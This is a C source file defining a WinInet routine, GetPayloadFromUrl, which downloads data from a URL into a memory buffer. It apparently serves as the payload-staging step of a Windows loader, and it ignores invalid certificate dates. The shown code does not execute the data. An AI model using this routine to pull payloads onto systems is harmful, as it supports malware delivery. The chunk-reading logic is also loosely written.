#include "Downloader.h"
#include <stdio.h>
#include <WinInet.h>

#pragma comment (lib, "Wininet.lib")

BOOL GetPayloadFromUrl(LPCWSTR url, PBYTE* payloadBuffer, SIZE_T* payloadSize) {
    BOOL success = TRUE;
    HINTERNET internetSession = NULL;
    HINTERNET internetFile = NULL;
    DWORD bytesRead = 0;
    SIZE_T totalSize = 0;
    PBYTE buffer = NULL;
    PBYTE tempBuffer = NULL;

    // Open an Internet session (no proxy options needed)
    printf("[INF] Initiate internet sesdsion using InternetOpenW()\n");
    internetSession = InternetOpenW(L"Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (internetSession == NULL) {
        printf("[ERR] InternetOpenW failed with error: %d\n", GetLastError());
        success = FALSE;
        goto Cleanup;
    }

    // Open the URL
    printf("[INF] Open url %ls using InternetOpenUrlW()\n", url);
    internetFile = InternetOpenUrlW(internetSession, url, NULL, 0,
        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (internetFile == NULL) {
        printf("[ERR] InternetOpenUrlW failed with error: %d\n", GetLastError());
        success = FALSE;
        goto Cleanup;
    }

    // Allocate temporary buffer of 1024 bytes.
    tempBuffer = (PBYTE)LocalAlloc(LPTR, 1024);
    if (tempBuffer == NULL) {
        success = FALSE;
        goto Cleanup;
    }

    // Read the payload in 1024-byte chunks.
    printf("[INF] Save data to allocate buffer\n");
    while (TRUE) {
        if (!InternetReadFile(internetFile, tempBuffer, 1024, &bytesRead)) {
            printf("[ERR] InternetReadFile failed with error: %d\n", GetLastError());
            success = FALSE;
            goto Cleanup;
        }

        totalSize += bytesRead;

        // Allocate or reallocate the payload buffer.
        if (buffer == NULL)
            buffer = (PBYTE)LocalAlloc(LPTR, bytesRead);
        else
            buffer = (PBYTE)LocalReAlloc(buffer, totalSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (buffer == NULL) {
            success = FALSE;
            goto Cleanup;
        }

        // Append the newly read bytes to the payload buffer.
        memcpy(buffer + (totalSize - bytesRead), tempBuffer, bytesRead);

        // Clear the temporary buffer.
        memset(tempBuffer, 0, bytesRead);

        // End loop if fewer than 1024 bytes were read.
        if (bytesRead < 1024) {
            break;
        }
    }

    *payloadBuffer = buffer;
    *payloadSize = totalSize;

Cleanup:
    if (internetSession)
        InternetCloseHandle(internetSession);
    if (internetFile)
        InternetCloseHandle(internetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    if (tempBuffer)
        LocalFree(tempBuffer);

    return success;
}